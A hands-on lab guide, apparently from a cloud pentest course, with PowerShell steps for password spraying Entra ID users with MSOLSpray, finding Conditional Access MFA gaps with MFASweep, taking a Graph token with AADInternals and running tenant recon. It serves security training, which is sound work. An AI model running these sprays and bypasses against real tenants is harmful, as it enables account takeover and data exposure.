### Run MSOLSpray to simulate a password spray attack
1. Import the MSOLSpray module
```
cd $env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray
Import-Module .\MSOLSpray.ps1
```

2. Copy the users.txt file from the Exercise files directory to the MSOLSpray directory and review the contents
* This contains a list of users that will be targets for the password spray attack
```
Copy-Item -Path "$HOME\Desktop\ExerciseFiles\Modules\03\users.txt" -Destination "$env:SystemDrive\PentestTools\Azure\Attack\MSOLSpray"

Get-Content .\users.txt
```

3. Run MSOLSpray
* Replace the SPRAY_PASSWORD_FROM_THE_LAB_INFO with the password from the LabXX-Info file.
```
Invoke-MSOLSpray -UserList .\users.txt -Password "SPRAY_PASSWORD_FROM_THE_LAB_INFO" -Verbose -OutFile .\sprayresults.txt
```
** Note the non-existent users and the users with MFA configured

4. View the result
* Notice that the user with the password from the attack path output was compromised
```
Get-Content .\sprayresults.txt
```

5. Open the Entra ID portal at **`https://entra.microsoft.com/`** in an InPrivate or Incognito window. Sign in with one of the matched credentials from the sprayresults.txt file.
* You should now be able to access the Entra ID portal as the user (Identity → Users → All users). Also, you should be able to review the information of other users in the tenant! (This is the default behavior).



## Bypassing conditional MFA with MFA Sweep
* In this exercise, we will use MFA sweeep to identify options to bypass conditional access MFA.
* **NOTE**: Use Alexander's account for this exercise

1. In your pentest VM, open the PowerShell console, switch directories to your user's directory, and clone the MFASweep GitHub repository using the following commands:
```
cd C:\Users\$env:USERNAME\
git clone https://github.com/dafthack/MFASweep.git
```

2. Import the MFASweep PowerShell module using the following commands:
```
cd .\MFASweep\
Import-Module .\MFASweep.ps1
```

3. Run MFASweep against any user accounts that you have compromised using the following commands. You should see a success message for any accounts that allow Conditional Access policy bypasses:

```
Invoke-MFASweep -Username "USER_WITH_MFA" -Password "SPRAY_PASSWORD_FROM_THE_LAB_INFO"
```

4. When prompted to perform ADFS checks, enter **`Y`** and press **`Enter`**.

5. When prompted about multiple login attempts, enter **`Y`** and press **`Enter`**.

6. Notice that the result showed that single factor authentication could be used for the Microsoft Graph API. This means that the user account can be used to bypass Conditional Access policies.

7. Use AADInternals to obtain an access token for Microsoft Graph API using the following commands:
* The operation should be successful
```
Import-Module AADInternals

$username = "ALEXANDER'S_USERNAME"
$password = "SPRAY_PASSWORD_FROM_THE_LAB_INFO" | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Get-AADIntAccessTokenForMSGraph -Credentials $cred -SaveToCache
```

8. View the cached token using the following command:
```
Get-AADIntCache
```

9. Run some recon commands:
```
Get-AADIntSubscriptions
Get-AADIntUsers | Select UserPrincipalName,ObjectId
```
